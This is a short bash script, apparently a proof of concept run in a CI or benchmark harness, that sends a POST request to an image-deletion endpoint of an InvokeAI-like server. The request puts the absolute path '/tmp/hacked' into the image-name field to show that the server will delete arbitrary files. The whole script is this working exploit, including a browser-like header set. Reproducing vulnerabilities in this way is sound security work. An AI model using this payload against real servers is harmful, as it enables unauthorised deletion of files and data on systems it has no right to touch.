#!/bin/bash
sleep 10 

IS_CI_RUN=$1 

if [ "$IS_CI_RUN" == "true" ]; then
  HOST="invokeai:9090"
else
  HOST="localhost:9090"
fi 

curl -X POST http://$HOST/api/v1/images/delete \
     -H "Host: $HOST" \
     -H "Accept-Language: zh-CN" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36" \
     -H "Accept: */*" \
     -H "Referer: http://$HOST/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Connection: keep-alive" \
     -H "Content-Type: application/json" \
     --data '{"image_names":["/tmp/hacked"]}'